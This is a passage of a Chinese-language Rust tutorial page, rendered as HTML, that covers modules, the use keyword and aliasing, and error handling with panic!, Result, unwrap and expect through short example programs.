</span><span id="__span-101-15"><a id="__codelineno-101-15" name="__codelineno-101-15" href="#note-cs-rust-rust-__codelineno-101-15"></a><span class="p">}</span>
</span><span id="__span-101-16"><a id="__codelineno-101-16" name="__codelineno-101-16" href="#note-cs-rust-rust-__codelineno-101-16"></a><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">eat_at_restaurant</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-101-17"><a id="__codelineno-101-17" name="__codelineno-101-17" href="#note-cs-rust-rust-__codelineno-101-17"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">meal</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">back_of_house</span>::<span class="n">Breakfast</span>::<span class="n">summer</span><span class="p">(</span><span class="s">&quot;Rye&quot;</span><span class="p">);</span>
</span><span id="__span-101-18"><a id="__codelineno-101-18" name="__codelineno-101-18" href="#note-cs-rust-rust-__codelineno-101-18"></a><span class="w">    </span><span class="n">meal</span><span class="p">.</span><span class="n">toast</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;Wheat&quot;</span><span class="p">);</span>
</span><span id="__span-101-19"><a id="__codelineno-101-19" name="__codelineno-101-19" href="#note-cs-rust-rust-__codelineno-101-19"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;I&#39;d like {} toast please&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">meal</span><span class="p">.</span><span class="n">toast</span><span class="p">);</span>
</span><span id="__span-101-20"><a id="__codelineno-101-20" name="__codelineno-101-20" href="#note-cs-rust-rust-__codelineno-101-20"></a><span class="p">}</span>
</span><span id="__span-101-21"><a id="__codelineno-101-21" name="__codelineno-101-21" href="#note-cs-rust-rust-__codelineno-101-21"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-101-22"><a id="__codelineno-101-22" name="__codelineno-101-22" href="#note-cs-rust-rust-__codelineno-101-22"></a><span class="w">    </span><span class="n">eat_at_restaurant</span><span class="p">()</span>
</span><span id="__span-101-23"><a id="__codelineno-101-23" name="__codelineno-101-23" href="#note-cs-rust-rust-__codelineno-101-23"></a><span class="p">}</span>
</span></code></pre></div>
枚举类枚举项可以内含字段，但不具备类似的性质:</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-102-1"><a id="__codelineno-102-1" name="__codelineno-102-1" href="#note-cs-rust-rust-__codelineno-102-1"></a><span class="k">mod</span> <span class="nn">SomeModule</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-102-2"><a id="__codelineno-102-2" name="__codelineno-102-2" href="#note-cs-rust-rust-__codelineno-102-2"></a><span class="w">    </span><span class="k">pub</span><span class="w"> </span><span class="k">enum</span> <span class="nc">Person</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-102-3"><a id="__codelineno-102-3" name="__codelineno-102-3" href="#note-cs-rust-rust-__codelineno-102-3"></a><span class="w">        </span><span class="n">King</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-102-4"><a id="__codelineno-102-4" name="__codelineno-102-4" href="#note-cs-rust-rust-__codelineno-102-4"></a><span class="w">            </span><span class="n">name</span>: <span class="nb">String</span>
</span><span id="__span-102-5"><a id="__codelineno-102-5" name="__codelineno-102-5" href="#note-cs-rust-rust-__codelineno-102-5"></a>        <span class="p">},</span>
</span><span id="__span-102-6"><a id="__codelineno-102-6" name="__codelineno-102-6" href="#note-cs-rust-rust-__codelineno-102-6"></a><span class="w">        </span><span class="n">Queen</span>
</span><span id="__span-102-7"><a id="__codelineno-102-7" name="__codelineno-102-7" href="#note-cs-rust-rust-__codelineno-102-7"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-102-8"><a id="__codelineno-102-8" name="__codelineno-102-8" href="#note-cs-rust-rust-__codelineno-102-8"></a><span class="p">}</span>
</span><span id="__span-102-9"><a id="__codelineno-102-9" name="__codelineno-102-9" href="#note-cs-rust-rust-__codelineno-102-9"></a>
</span><span id="__span-102-10"><a id="__codelineno-102-10" name="__codelineno-102-10" href="#note-cs-rust-rust-__codelineno-102-10"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-102-11"><a id="__codelineno-102-11" name="__codelineno-102-11" href="#note-cs-rust-rust-__codelineno-102-11"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">person</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SomeModule</span>::<span class="n">Person</span>::<span class="n">King</span><span class="p">{</span>
</span><span id="__span-102-12"><a id="__codelineno-102-12" name="__codelineno-102-12" href="#note-cs-rust-rust-__codelineno-102-12"></a><span class="w">        </span><span class="n">name</span>: <span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;Blue&quot;</span><span class="p">)</span>
</span><span id="__span-102-13"><a id="__codelineno-102-13" name="__codelineno-102-13" href="#note-cs-rust-rust-__codelineno-102-13"></a><span class="w">    </span><span class="p">};</span>
</span><span id="__span-102-14"><a id="__codelineno-102-14" name="__codelineno-102-14" href="#note-cs-rust-rust-__codelineno-102-14"></a><span class="w">    </span><span class="k">match</span><span class="w"> </span><span class="n">person</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-102-15"><a id="__codelineno-102-15" name="__codelineno-102-15" href="#note-cs-rust-rust-__codelineno-102-15"></a><span class="w">        </span><span class="n">SomeModule</span>::<span class="n">Person</span>::<span class="n">King</span><span class="w"> </span><span class="p">{</span><span class="n">name</span><span class="p">}</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-102-16"><a id="__codelineno-102-16" name="__codelineno-102-16" href="#note-cs-rust-rust-__codelineno-102-16"></a><span class="w">            </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">);</span>
</span><span id="__span-102-17"><a id="__codelineno-102-17" name="__codelineno-102-17" href="#note-cs-rust-rust-__codelineno-102-17"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-102-18"><a id="__codelineno-102-18" name="__codelineno-102-18" href="#note-cs-rust-rust-__codelineno-102-18"></a><span class="w">        </span><span class="n">_</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{}</span>
</span><span id="__span-102-19"><a id="__codelineno-102-19" name="__codelineno-102-19" href="#note-cs-rust-rust-__codelineno-102-19"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-102-20"><a id="__codelineno-102-20" name="__codelineno-102-20" href="#note-cs-rust-rust-__codelineno-102-20"></a><span class="p">}</span>
</span></code></pre></div>
<h3 id="note-cs-rust-rust-_38">难以发现的模块<a class="headerlink" href="#note-cs-rust-rust-_38" title="Permanent link">&para;</a></h3>
<p>使用过 Java 的开发者在编程时往往非常讨厌最外层的 class 块——它的名字与文件名一模一样，因为它就表示文件容器，尽管它很繁琐但我们不得不写一遍来强调"这个类是文件所包含的类"。</p>
<p>不过这样有一些好处：起码它让开发者明明白白的意识到了类包装的存在，而且可以明确的描述类的继承关系。</p>
<p>在 Rust 中，模块就像是 Java 中的类包装，但是文件一开头就可以写一个主函数，这该如何解释呢？</p>
<p>每一个 Rust 文件的内容都是一个"难以发现"的模块。</p>
<p>让我们用两个文件来揭示这一点：</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-103-1"><a id="__codelineno-103-1" name="__codelineno-103-1" href="#note-cs-rust-rust-__codelineno-103-1"></a><span class="c1">// main.rs</span>
</span><span id="__span-103-2"><a id="__codelineno-103-2" name="__codelineno-103-2" href="#note-cs-rust-rust-__codelineno-103-2"></a><span class="k">mod</span> <span class="nn">second_module</span><span class="p">;</span>
</span><span id="__span-103-3"><a id="__codelineno-103-3" name="__codelineno-103-3" href="#note-cs-rust-rust-__codelineno-103-3"></a>
</span><span id="__span-103-4"><a id="__codelineno-103-4" name="__codelineno-103-4" href="#note-cs-rust-rust-__codelineno-103-4"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-103-5"><a id="__codelineno-103-5" name="__codelineno-103-5" href="#note-cs-rust-rust-__codelineno-103-5"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;This is the main module.&quot;</span><span class="p">);</span>
</span><span id="__span-103-6"><a id="__codelineno-103-6" name="__codelineno-103-6" href="#note-cs-rust-rust-__codelineno-103-6"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">second_module</span>::<span class="n">message</span><span class="p">());</span>
</span><span id="__span-103-7"><a id="__codelineno-103-7" name="__codelineno-103-7" href="#note-cs-rust-rust-__codelineno-103-7"></a><span class="p">}</span>
</span></code></pre></div>
<p><div class="language-rust highlight"><pre><span></span><code><span id="__span-104-1"><a id="__codelineno-104-1" name="__codelineno-104-1" href="#note-cs-rust-rust-__codelineno-104-1"></a><span class="c1">// second_module.rs</span>
</span><span id="__span-104-2"><a id="__codelineno-104-2" name="__codelineno-104-2" href="#note-cs-rust-rust-__codelineno-104-2"></a><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">message</span><span class="p">()</span><span class="w"> </span>-&gt; <span class="nb">String</span> <span class="p">{</span>
</span><span id="__span-104-3"><a id="__codelineno-104-3" name="__codelineno-104-3" href="#note-cs-rust-rust-__codelineno-104-3"></a><span class="w">    </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;This is the 2nd module.&quot;</span><span class="p">)</span>
</span><span id="__span-104-4"><a id="__codelineno-104-4" name="__codelineno-104-4" href="#note-cs-rust-rust-__codelineno-104-4"></a><span class="p">}</span>
</span></code></pre></div>
输出
<div class="language-text highlight"><pre><span></span><code><span id="__span-105-1"><a id="__codelineno-105-1" name="__codelineno-105-1" href="#note-cs-rust-rust-__codelineno-105-1"></a>This is the main module.
</span><span id="__span-105-2"><a id="__codelineno-105-2" name="__codelineno-105-2" href="#note-cs-rust-rust-__codelineno-105-2"></a>This is the 2nd module.
</span></code></pre></div></p>
<h3 id="note-cs-rust-rust-use">use关键字<a class="headerlink" href="#note-cs-rust-rust-use" title="Permanent link">&para;</a></h3>
<p>use 关键字能够将模块标识符引入当前作用域：</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-106-1"><a id="__codelineno-106-1" name="__codelineno-106-1" href="#note-cs-rust-rust-__codelineno-106-1"></a><span class="k">mod</span> <span class="nn">nation</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-106-2"><a id="__codelineno-106-2" name="__codelineno-106-2" href="#note-cs-rust-rust-__codelineno-106-2"></a><span class="w">    </span><span class="k">pub</span><span class="w"> </span><span class="k">mod</span> <span class="nn">government</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-106-3"><a id="__codelineno-106-3" name="__codelineno-106-3" href="#note-cs-rust-rust-__codelineno-106-3"></a><span class="w">        </span><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">govern</span><span class="p">()</span><span class="w"> </span><span class="p">{}</span>
</span><span id="__span-106-4"><a id="__codelineno-106-4" name="__codelineno-106-4" href="#note-cs-rust-rust-__codelineno-106-4"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-106-5"><a id="__codelineno-106-5" name="__codelineno-106-5" href="#note-cs-rust-rust-__codelineno-106-5"></a><span class="p">}</span>
</span><span id="__span-106-6"><a id="__codelineno-106-6" name="__codelineno-106-6" href="#note-cs-rust-rust-__codelineno-106-6"></a>
</span><span id="__span-106-7"><a id="__codelineno-106-7" name="__codelineno-106-7" href="#note-cs-rust-rust-__codelineno-106-7"></a><span class="k">use</span><span class="w"> </span><span class="k">crate</span>::<span class="n">nation</span>::<span class="n">government</span>::<span class="n">govern</span><span class="p">;</span>
</span><span id="__span-106-8"><a id="__codelineno-106-8" name="__codelineno-106-8" href="#note-cs-rust-rust-__codelineno-106-8"></a>
</span><span id="__span-106-9"><a id="__codelineno-106-9" name="__codelineno-106-9" href="#note-cs-rust-rust-__codelineno-106-9"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-106-10"><a id="__codelineno-106-10" name="__codelineno-106-10" href="#note-cs-rust-rust-__codelineno-106-10"></a><span class="w">    </span><span class="n">govern</span><span class="p">();</span>
</span><span id="__span-106-11"><a id="__codelineno-106-11" name="__codelineno-106-11" href="#note-cs-rust-rust-__codelineno-106-11"></a><span class="p">}</span>
</span></code></pre></div>
<p>这段程序能够通过编译。</p>
<p>因为 use 关键字把 govern 标识符导入到了当前的模块下，可以直接使用。</p>
<p>这样就解决了局部模块路径过长的问题。</p>
<p>当然，有些情况下存在两个相同的名称，且同样需要导入，我们可以使用 as 关键字为标识符添加别名：</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-107-1"><a id="__codelineno-107-1" name="__codelineno-107-1" href="#note-cs-rust-rust-__codelineno-107-1"></a><span class="k">mod</span> <span class="nn">nation</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-107-2"><a id="__codelineno-107-2" name="__codelineno-107-2" href="#note-cs-rust-rust-__codelineno-107-2"></a><span class="w">    </span><span class="k">pub</span><span class="w"> </span><span class="k">mod</span> <span class="nn">government</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-107-3"><a id="__codelineno-107-3" name="__codelineno-107-3" href="#note-cs-rust-rust-__codelineno-107-3"></a><span class="w">        </span><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">govern</span><span class="p">()</span><span class="w"> </span><span class="p">{}</span>
</span><span id="__span-107-4"><a id="__codelineno-107-4" name="__codelineno-107-4" href="#note-cs-rust-rust-__codelineno-107-4"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-107-5"><a id="__codelineno-107-5" name="__codelineno-107-5" href="#note-cs-rust-rust-__codelineno-107-5"></a><span class="w">    </span><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">govern</span><span class="p">()</span><span class="w"> </span><span class="p">{}</span>
</span><span id="__span-107-6"><a id="__codelineno-107-6" name="__codelineno-107-6" href="#note-cs-rust-rust-__codelineno-107-6"></a><span class="p">}</span>
</span><span id="__span-107-7"><a id="__codelineno-107-7" name="__codelineno-107-7" href="#note-cs-rust-rust-__codelineno-107-7"></a>
</span><span id="__span-107-8"><a id="__codelineno-107-8" name="__codelineno-107-8" href="#note-cs-rust-rust-__codelineno-107-8"></a><span class="k">use</span><span class="w"> </span><span class="k">crate</span>::<span class="n">nation</span>::<span class="n">government</span>::<span class="n">govern</span><span class="p">;</span>
</span><span id="__span-107-9"><a id="__codelineno-107-9" name="__codelineno-107-9" href="#note-cs-rust-rust-__codelineno-107-9"></a><span class="k">use</span><span class="w"> </span><span class="k">crate</span>::<span class="n">nation</span>::<span class="n">govern</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">nation_govern</span><span class="p">;</span>
</span><span id="__span-107-10"><a id="__codelineno-107-10" name="__codelineno-107-10" href="#note-cs-rust-rust-__codelineno-107-10"></a>
</span><span id="__span-107-11"><a id="__codelineno-107-11" name="__codelineno-107-11" href="#note-cs-rust-rust-__codelineno-107-11"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-107-12"><a id="__codelineno-107-12" name="__codelineno-107-12" href="#note-cs-rust-rust-__codelineno-107-12"></a><span class="w">    </span><span class="n">nation_govern</span><span class="p">();</span>
</span><span id="__span-107-13"><a id="__codelineno-107-13" name="__codelineno-107-13" href="#note-cs-rust-rust-__codelineno-107-13"></a><span class="w">    </span><span class="n">govern</span><span class="p">();</span>
</span><span id="__span-107-14"><a id="__codelineno-107-14" name="__codelineno-107-14" href="#note-cs-rust-rust-__codelineno-107-14"></a><span class="p">}</span>
</span></code></pre></div>
<p>这里有两个 <code>govern</code> 函数，一个是 <code>nation</code> 下的，一个是 <code>government</code> 下的，我们用 <code>as</code> 将 <code>nation</code> 下的取别名 <code>nation_govern</code>。两个名称可以同时使用。</p>
<p><code>use</code> 关键字可以与 <code>pub</code> 关键字配合使用：</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-108-1"><a id="__codelineno-108-1" name="__codelineno-108-1" href="#note-cs-rust-rust-__codelineno-108-1"></a><span class="k">mod</span> <span class="nn">nation</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-108-2"><a id="__codelineno-108-2" name="__codelineno-108-2" href="#note-cs-rust-rust-__codelineno-108-2"></a><span class="w">    </span><span class="k">pub</span><span class="w"> </span><span class="k">mod</span> <span class="nn">government</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-108-3"><a id="__codelineno-108-3" name="__codelineno-108-3" href="#note-cs-rust-rust-__codelineno-108-3"></a><span class="w">        </span><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">govern</span><span class="p">()</span><span class="w"> </span><span class="p">{}</span>
</span><span id="__span-108-4"><a id="__codelineno-108-4" name="__codelineno-108-4" href="#note-cs-rust-rust-__codelineno-108-4"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-108-5"><a id="__codelineno-108-5" name="__codelineno-108-5" href="#note-cs-rust-rust-__codelineno-108-5"></a><span class="w">    </span><span class="k">pub</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="n">government</span>::<span class="n">govern</span><span class="p">;</span>
</span><span id="__span-108-6"><a id="__codelineno-108-6" name="__codelineno-108-6" href="#note-cs-rust-rust-__codelineno-108-6"></a><span class="p">}</span>
</span><span id="__span-108-7"><a id="__codelineno-108-7" name="__codelineno-108-7" href="#note-cs-rust-rust-__codelineno-108-7"></a>
</span><span id="__span-108-8"><a id="__codelineno-108-8" name="__codelineno-108-8" href="#note-cs-rust-rust-__codelineno-108-8"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-108-9"><a id="__codelineno-108-9" name="__codelineno-108-9" href="#note-cs-rust-rust-__codelineno-108-9"></a><span class="w">    </span><span class="n">nation</span>::<span class="n">govern</span><span class="p">();</span>
</span><span id="__span-108-10"><a id="__codelineno-108-10" name="__codelineno-108-10" href="#note-cs-rust-rust-__codelineno-108-10"></a><span class="p">}</span>
</span></code></pre></div>
<p>然后，我们就可以轻松地导入系统库来开发程序了
<div class="language-rust highlight"><pre><span></span><code><span id="__span-109-1"><a id="__codelineno-109-1" name="__codelineno-109-1" href="#note-cs-rust-rust-__codelineno-109-1"></a><span class="k">use</span><span class="w"> </span><span class="n">std</span>::<span class="kt">f64</span>::<span class="n">consts</span>::<span class="n">PI</span><span class="p">;</span>
</span><span id="__span-109-2"><a id="__codelineno-109-2" name="__codelineno-109-2" href="#note-cs-rust-rust-__codelineno-109-2"></a>
</span><span id="__span-109-3"><a id="__codelineno-109-3" name="__codelineno-109-3" href="#note-cs-rust-rust-__codelineno-109-3"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-109-4"><a id="__codelineno-109-4" name="__codelineno-109-4" href="#note-cs-rust-rust-__codelineno-109-4"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">PI</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">2.0</span><span class="p">).</span><span class="n">sin</span><span class="p">());</span>
</span><span id="__span-109-5"><a id="__codelineno-109-5" name="__codelineno-109-5" href="#note-cs-rust-rust-__codelineno-109-5"></a><span class="p">}</span>
</span></code></pre></div></p>
<h2 id="note-cs-rust-rust-_39">错误处理<a class="headerlink" href="#note-cs-rust-rust-_39" title="Permanent link">&para;</a></h2>
<p>Rust 有一套独特的处理异常情况的机制，它并不像其它语言中的 try 机制那样简单。</p>
<p>首先，程序中一般会出现两种错误：可恢复错误和不可恢复错误。</p>
<p>可恢复错误的典型案例是文件访问错误，如果访问一个文件失败，有可能是因为它正在被占用，是正常的，我们可以通过等待来解决。</p>
<p>但还有一种错误是由编程中无法解决的逻辑错误导致的，例如访问数组末尾以外的位置。</p>
<p>大多数编程语言不区分这两种错误，并用 <code>Exception</code> （异常）类来表示错误。在 Rust 中没有 <code>Exception</code>。</p>
<p>对于可恢复错误用 <code>Result&lt;T, E&gt;</code> 类来处理，对于不可恢复错误使用 <code>panic!</code> 宏来处理。</p>
<h3 id="note-cs-rust-rust-_40">不可恢复错误<a class="headerlink" href="#note-cs-rust-rust-_40" title="Permanent link">&para;</a></h3>
<p>不可恢复错误会导致程序受到致命的打击而终止运行</p>
<p>例如</p>
<p><div class="language-rust highlight"><pre><span></span><code><span id="__span-110-1"><a id="__codelineno-110-1" name="__codelineno-110-1" href="#note-cs-rust-rust-__codelineno-110-1"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-110-2"><a id="__codelineno-110-2" name="__codelineno-110-2" href="#note-cs-rust-rust-__codelineno-110-2"></a><span class="w">    </span><span class="fm">panic!</span><span class="p">(</span><span class="s">&quot;error occured&quot;</span><span class="p">);</span>
</span><span id="__span-110-3"><a id="__codelineno-110-3" name="__codelineno-110-3" href="#note-cs-rust-rust-__codelineno-110-3"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;Hello, Rust&quot;</span><span class="p">);</span>
</span><span id="__span-110-4"><a id="__codelineno-110-4" name="__codelineno-110-4" href="#note-cs-rust-rust-__codelineno-110-4"></a><span class="p">}</span>
</span></code></pre></div>
运行结果
<img alt="alt text" src="../NOTE/CS/RUST/image.png" /></p>
<ul>
<li>
<p>第一行第二行输出了<code>panic!</code>宏调用的位置以及其输出的错误信息</p>
</li>
<li>
<p>第二行是一句提示第二行是一句提示，翻译成中文就是"通过 <code>RUST_BACKTRACE=1</code> 环境变量运行以显示回溯"。</p>
</li>
</ul>
<h3 id="note-cs-rust-rust-_41">可恢复的错误<a class="headerlink" href="#note-cs-rust-rust-_41" title="Permanent link">&para;</a></h3>
<p>此概念十分类似于 Java 编程语言中的异常。实际上在 C 语言中我们就常常将函数返回值设置成整数来表达函数遇到的错误，在 Rust 中通过 Result<T, E> 枚举类作返回值来进行异常表达：
<div class="language-rust highlight"><pre><span></span><code><span id="__span-111-1"><a id="__codelineno-111-1" name="__codelineno-111-1" href="#note-cs-rust-rust-__codelineno-111-1"></a><span class="k">enum</span> <span class="nb">Result</span><span class="o">&lt;</span><span class="n">T</span><span class="p">,</span><span class="w"> </span><span class="n">E</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-111-2"><a id="__codelineno-111-2" name="__codelineno-111-2" href="#note-cs-rust-rust-__codelineno-111-2"></a><span class="w">    </span><span class="nb">Ok</span><span class="p">(</span><span class="n">T</span><span class="p">),</span>
</span><span id="__span-111-3"><a id="__codelineno-111-3" name="__codelineno-111-3" href="#note-cs-rust-rust-__codelineno-111-3"></a><span class="w">    </span><span class="nb">Err</span><span class="p">(</span><span class="n">E</span><span class="p">),</span>
</span><span id="__span-111-4"><a id="__codelineno-111-4" name="__codelineno-111-4" href="#note-cs-rust-rust-__codelineno-111-4"></a><span class="p">}</span>
</span></code></pre></div></p>
<p>在 Rust 标准库中可能产生异常的函数的返回值都是 Result 类型的。例如：当我们尝试打开一个文件时：
<div class="language-rust highlight"><pre><span></span><code><span id="__span-112-1"><a id="__codelineno-112-1" name="__codelineno-112-1" href="#note-cs-rust-rust-__codelineno-112-1"></a><span class="k">use</span><span class="w"> </span><span class="n">std</span>::<span class="n">fs</span>::<span class="n">File</span><span class="p">;</span>
</span><span id="__span-112-2"><a id="__codelineno-112-2" name="__codelineno-112-2" href="#note-cs-rust-rust-__codelineno-112-2"></a>
</span><span id="__span-112-3"><a id="__codelineno-112-3" name="__codelineno-112-3" href="#note-cs-rust-rust-__codelineno-112-3"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-112-4"><a id="__codelineno-112-4" name="__codelineno-112-4" href="#note-cs-rust-rust-__codelineno-112-4"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">f</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">File</span>::<span class="n">open</span><span class="p">(</span><span class="s">&quot;hello.txt&quot;</span><span class="p">);</span>
</span><span id="__span-112-5"><a id="__codelineno-112-5" name="__codelineno-112-5" href="#note-cs-rust-rust-__codelineno-112-5"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="nb">Ok</span><span class="p">(</span><span class="n">file</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">f</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-112-6"><a id="__codelineno-112-6" name="__codelineno-112-6" href="#note-cs-rust-rust-__codelineno-112-6"></a><span class="w">        </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;File opened successfully.&quot;</span><span class="p">);</span>
</span><span id="__span-112-7"><a id="__codelineno-112-7" name="__codelineno-112-7" href="#note-cs-rust-rust-__codelineno-112-7"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-112-8"><a id="__codelineno-112-8" name="__codelineno-112-8" href="#note-cs-rust-rust-__codelineno-112-8"></a><span class="w">        </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;Failed to open the file.&quot;</span><span class="p">);</span>
</span><span id="__span-112-9"><a id="__codelineno-112-9" name="__codelineno-112-9" href="#note-cs-rust-rust-__codelineno-112-9"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-112-10"><a id="__codelineno-112-10" name="__codelineno-112-10" href="#note-cs-rust-rust-__codelineno-112-10"></a><span class="p">}</span>
</span></code></pre></div></p>
<p>如果想使一个可恢复错误按不可恢复错误处理，Result 类提供了两个办法：unwrap() 和 expect(message: &amp;str) ：</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-113-1"><a id="__codelineno-113-1" name="__codelineno-113-1" href="#note-cs-rust-rust-__codelineno-113-1"></a><span class="k">use</span><span class="w"> </span><span class="n">std</span>::<span class="n">fs</span>::<span class="n">File</span><span class="p">;</span>
</span><span id="__span-113-2"><a id="__codelineno-113-2" name="__codelineno-113-2" href="#note-cs-rust-rust-__codelineno-113-2"></a>
</span><span id="__span-113-3"><a id="__codelineno-113-3" name="__codelineno-113-3" href="#note-cs-rust-rust-__codelineno-113-3"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-113-4"><a id="__codelineno-113-4" name="__codelineno-113-4" href="#note-cs-rust-rust-__codelineno-113-4"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">f1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">File</span>::<span class="n">open</span><span class="p">(</span><span class="s">&quot;hello.txt&quot;</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span>
</span><span id="__span-113-5"><a id="__codelineno-113-5" name="__codelineno-113-5" href="#note-cs-rust-rust-__codelineno-113-5"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">f2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">File</span>::<span class="n">open</span><span class="p">(</span><span class="s">&quot;hello.txt&quot;</span><span class="p">).</span><span class="n">expect</span><span class="p">(</span><span class="s">&quot;Failed to open.&quot;</span><span class="p">);</span>
</span><span id="__span-113-6"><a id="__codelineno-113-6" name="__codelineno-113-6" href="#note-cs-rust-rust-__codelineno-113-6"></a><span class="p">}</span>
</span></code></pre></div>
<h4 id="note-cs-rust-rust-_42">可恢复的错误的传递<a class="headerlink" href="#note-cs-rust-rust-_42" title="Permanent link">&para;</a></h4>
<p>之前所讲的是接收到错误的处理方式，但是如果我们自己编写一个函数在遇到错误时想传递出去怎么办呢？</p>
<p><div class="language-rust highlight"><pre><span></span><code><span id="__span-114-1"><a id="__codelineno-114-1" name="__codelineno-114-1" href="#note-cs-rust-rust-__codelineno-114-1"></a><span class="k">fn</span> <span class="nf">f</span><span class="p">(</span><span class="n">i</span>: <span class="kt">i32</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nb">Result</span><span class="o">&lt;</span><span class="kt">i32</span><span class="p">,</span><span class="w"> </span><span class="kt">bool</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-114-2"><a id="__codelineno-114-2" name="__codelineno-114-2" href="#note-cs-rust-rust-__codelineno-114-2"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nb">Ok</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="p">}</span>
</span><span id="__span-114-3"><a id="__codelineno-114-3" name="__codelineno-114-3" href="#note-cs-rust-rust-__codelineno-114-3"></a><span class="w">    </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nb">Err</span><span class="p">(</span><span class="kc">false</span><span class="p">)</span><span class="w"> </span><span class="p">}</span>
</span><span id="__span-114-4"><a id="__codelineno-114-4" name="__codelineno-114-4" href="#note-cs-rust-rust-__codelineno-114-4"></a><span class="p">}</span>
